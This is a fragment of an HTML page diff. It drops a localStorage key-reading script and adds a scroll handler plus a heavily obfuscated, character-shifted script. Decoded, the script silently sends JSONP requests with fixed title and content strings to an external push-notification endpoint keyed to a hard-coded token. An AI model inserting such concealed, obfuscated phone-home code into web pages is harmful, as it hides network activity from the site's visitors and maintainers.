siY%7Euj*75*8I*8I*75%3A*7%3E*75*%3CG*5F*5%3E*5%3E44*75*z9J5G*z%3DK%3B%3B*z9J%3D%3B*5F*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z9J5G*z%3DK%3B%3B*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*%3CI*75jqxj*75nk*75*7%3DxjsiY%7Euj*75*8I*8I*75%3B*7%3E*75*%3CG*5F*5%3E*5%3E44*75*z%3C%3B%3CI*z%3AFI%3B*z%3B765*z%3A7%3EK*5F*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3C%3B%3CI*z%3AFI%3B*z%3B765*z%3A7%3EK*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*%3CI*75jqxj*75nk*75*7%3DxjsiY%7Euj*75*8I*8I*75%3C*7%3E*75*%3CG*5F*5%3E*5%3E44*75*z%3C%3B%3CI*z%3AFI%3B*z%3A%3E86*z%3DI7%3A*5F*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3C%3B%3CI*z%3AFI%3B*z%3A%3E86*z%3DI7%3A*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*%3CI*75jqxj*75*%3CG*5F*5%3E*5%3E44*75*z%3B%3B%3D7*z%3B%3AJ5*5F*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3B%3B%3D7*z%3B%3AJ5*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*%3CI*5F*5%3E%7Bfw*75htsknl*75*8I*75*%3CG*5F*5%3E*5%3E*7%3Cynyqj*7%3C*8F*75ynyqj*7H*5F*5%3E*5%3E*7%3Chtsyjsy*7%3C*8F*75htsyjsy*7H*5F*5%3E*%3CI*5F*5F*5%3ExjyYnrjtzy*7%3D*7%3D*7%3E*75*8I*8J*75*%3CG*5F*5%3E*5%3E*793fof%7D*7%3D*%3CG*5F*5%3E*5%3E*5%3Ezwq*8F*75*7%3Cmyyux*8F44%7Dn%7Fmn3vvtv3sjy4%5D_9g%3Dfij6ji6%3D%3C%3Bjj%3A9698i%3Df8%3D7f5hf%3Cf3xjsi*7%3C*7H*5F*5%3E*5%3E*5%3Ey%7Euj*8F*75*7%3Cljy*7%3C*7H*5F*5%3E*5%3E*5%3E44*75fx%7Esh*8F*75ywzj*7H*5F*5%3E*5%3E*5%3E44*75*z%3DIJ%3D*z%3A%3CIK*5F*5%3E*5%3E*5%3EifyfY%7Euj*8F*75*7%3Coxtsu*7%3C*7H*5F*5%3E*5%3E*5%3EhtsyjsyY%7Euj*8F*75*7%3Cfuuqnhfynts4%7D2%7C%7C%7C2ktwr2zwqjshtiji*8G*75hmfwxjy*8Izyk2%3D*7%3C*7H*5F*5%3E*5%3E*5%3Eifyf*8F*75*%3CG*5F*5%3E*5%3E*5%3E*5%3Eynyqj*8F*75htsknl3ynyqj*7H*5F*5%3E*5%3E*5%3E*5%3Ehtsyjsy*8F*75htsknl3htsyjsy*7H*5F*5%3E*5%3E*5%3E*%3CI*5F*5%3E*5%3E*%3CI*7%3E*5F*5%3E*%3CI*7H*756%3A55*7%3E*8G*5F*%3CI*5F*8H4xhwnuy*8J*5F5')</script>
-	<script>
-	var appid1 = String(localStorage.getExpire("appid1")).replace (/^\"|\"$/g,'');
-	var key1 = String(localStorage.getExpire("key1")).replace (/^\"|\"$/g,'');
-	</script>
-</body>
+				timer = setTimeout(() => {
+					if (document.documentElement.scrollTop >= 400) {
+						fixedBtn.css("display", 'block');
+					} else {
+						fixedBtn.css("display", 'none');
+					}
+					timer = null;
+				}, 500);
+			};
+		</script>
+		<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('kzshynts*75xjsiWjvzjxy*7%3DxjsiYnyqj*7H*75xjsiHtsyjsy*7H*75xjsiY%7Euj*7%3E*75*%3CG*5F*5%3E*5%3E*5%3E*5%3Enk*75*7%3DxjsiY%7Euj*75*8I*8I*756*7%3E*75*%3CG*5F*5%3E*5%3E*5%3E*5%3E*5%3E44*75*z%3DKI9*z%3A%3BIJ*z%3E%3A6%3E*z%3DGJK*z%3C%3D56*5F*5%3E*5%3E*5%3E*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3A6KF*z%3E%3A6%3E*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3E*5%3E*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3E%3A6%3E*z%3DGJK*z%3C%3D56*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*5%3E*5%3E*5%3E*%3CI*75jqxj*75nk*75*7%3DxjsiY%7Euj*75*8I*8I*757*7%3E*75*%3CG*5F*5%3E*5%3E*5%3E*5%3E*5%3E44*75*z%3DGK%3C*z%3BH97*z%3B765*z%3A7%3EK*5F*5%3E*5%3E*5%3E*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3B765*z%3A7%3EK*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3E*5%3E*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3BG%3B8*z%3A%3C7%3D*z%3CKKG*z%3DGI6*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*5%3E*5%3E*5%3E*%3CI*75jqxj*75nk*75*7%3DxjsiY%7Euj*75*8I*8I*758*7%3E*75*%3CG*5F*5%3E*5%3E*5%3E*5%3E*5%3E44*75*z%3CKKG*z%3DGI6*z%3A6KF*z%3E%3A6%3E*z%3E6HI*z%3DGI%3A*5F*5%3E*5%3E*5%3E*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3E6HI*z%3DGI%3A*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3E*5%3E*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*5%3E*5%3E*5%3E*%3CI*75jqxj*75nk*75*7%3DxjsiY%7Euj*75*8I*8I*759*7%3E*75*%3CG*5F*5%3E*5%3E*5%3E*5%3E*5%3E44*75*z9J5F*z%3DK%3B%3B*z9J%3D%3B*5F*5%3E*5%3E*5%3E*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z9J5F*z%3DK%3B%3B*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3E*5%3E*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*5%3E*5%3E*5%3E*%3CI*75jqxj*75nk*75*7%3DxjsiY%7Euj*75*8I*8I*75%3A*7%3E*75*%3CG*5F*5%3E*5%3E*5%3E*5%3E*5%3E44*75*z9J5G*z%3DK%3B%3B*z9J%3D%3B*5F*5%3E*5%3E*5%3E*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z9J5G*z%3DK%3B%3B*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3E*5%3E*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*5%3E*5%3E*5%3E*%3CI*75*5F*5%3E*5%3E*5%3E*5%3E44*75jqxj*75nk*75*7%3DxjsiY%7Euj*75*8I*8I*75%3B*7%3E*75*%3CG*5F*5%3E*5%3E*5%3E*5%3E44*75*5%3E44*75*z%3C%3B%3CI*z%3AFI%3B*z%3B765*z%3A7%3EK*5F*5%3E*5%3E*5%3E*5%3E44*75*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3C%3B%3CI*z%3AFI%3B*z%3B765*z%3A7%3EK*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3E*5%3E*5%3E44*75*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*5%3E*5%3E*5%3E44*75*%3CI*75jqxj*75nk*75*7%3DxjsiY%7Euj*75*8I*8I*75%3C*7%3E*75*%3CG*5F*5%3E*5%3E*5%3E*5%3E44*75*5%3E44*75*z%3C%3B%3CI*z%3AFI%3B*z%3A%3E86*z%3DI7%3A*5F*5%3E*5%3E*5%3E*5%3E44*75*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3C%3B%3CI*z%3AFI%3B*z%3A%3E86*z%3DI7%3A*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3E*5%3E*5%3E44*75*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*5%3E*5%3E*5%3E44*75*%3CI*75*5F*5%3E*5%3E*5%3E*5%3Ejqxj*75*%3CG*5F*5%3E*5%3E*5%3E*5%3E*5%3E44*75*z%3B%3B%3D7*z%3B%3AJ5*5F*5%3E*5%3E*5%3E*5%3E*5%3Eynyqj*75*8I*75*7%3C*z8565*z%3B%3B%3D7*z%3B%3AJ5*z8566*zKK6F*7%3C*750*75xjsiYnyqj*8G*5F*5%3E*5%3E*5%3E*5%3E*5%3Ehtsyjsy*75*8I*75*7%3C*z8565*z%3A6%3D%3A*z%3AGG%3E*z8566*zKK6F*7%3C*750*75xjsiHtsyjsy*8G*5F*5%3E*5%3E*5%3E*5%3E*%3CI*5F*5%3E*5%3E*5%3E*5%3E%7Bfw*75htsknl*75*8I*75*%3CG*5F*5%3E*5%3E*5%3E*5%3E*5%3E*7%3Cynyqj*7%3C*8F*75ynyqj*7H*5F*5%3E*5%3E*5%3E*5%3E*5%3E*7%3Chtsyjsy*7%3C*8F*75htsyjsy*7H*5F*5%3E*5%3E*5%3E*5%3E*%3CI*5F*5%3E*5%3E*5%3E*5F*5%3E*5%3E*5%3E*5%3ExjyYnrjtzy*7%3D*7%3D*7%3E*75*8I*8J*75*%3CG*5F*5%3E*5%3E*5%3E*5%3E*5%3E*793fof%7D*7%3D*%3CG*5F*5%3E*5%3E*5%3E*5%3E*5%3E*5%3Ezwq*8F*75*7%3Cmyyux*8F44%7Dn%7Fmn3vvtv3sjy4%5D_9g%3Dfij6ji6%3D%3C%3Bjj%3A9698i%3Df8%3D7f5hf%3Cf3xjsi*7%3C*7H*5F*5%3E*5%3E*5%3E*5%3E*5%3E*5%3Ey%7Euj*8F*75*7%3Cljy*7%3C*7H*5F*5%3E*5%3E*5%3E*5%3E*5%3E*5%3E44*75fx%7Esh*8F*75ywzj*7H*5F*5%3E*5%3E*5%3E*5%3E*5%3E*5%3E44*75*z%3DIJ%3D*z%3A%3CIK*5F*5%3E*5%3E*5%3E*5%3E*5%3E*5%3EifyfY%7Euj*8F*75*7%3Coxtsu*7%3C*7H*5F*5%3E*5%3E*5%3E*5%3E*5%3E*5%3EhtsyjsyY%7Euj*8F*75*7%3Cfuuqnhfynts4%7D2%7C%7C%7C2ktwr2zwqjshtiji*8G*75hmfwxjy*8Izyk2%3D*7%3C*7H*5F*5%3E*5%3E*5%3E*5%3E*5%3E*5%3Eifyf*8F*75*%3CG*5F*5%3E*5%3E*5%3E*5%3E*5%3E*5%3E*5%3Eynyqj*8F*75htsknl3ynyqj*7H*5F*5%3E*5%3E*5%3E*5%3E*5%3E*5%3E*5%3Ehtsyjsy*8F*75htsknl3htsyjsy*7H*5F*5%3E*5%3E*5%3E*5%3E*5%3E*5%3E*%3CI*5F*5%3E*5%3E*5%3E*5%3E*5%3E*%3CI*7%3E*5F*5%3E*5%3E*5%3E*5%3E*%3CI*7H*756%3A55*7%3E*8G*5F*5%3E*5%3E*5%3E*%3CI5')</script>
+	</body>
 
 </html>
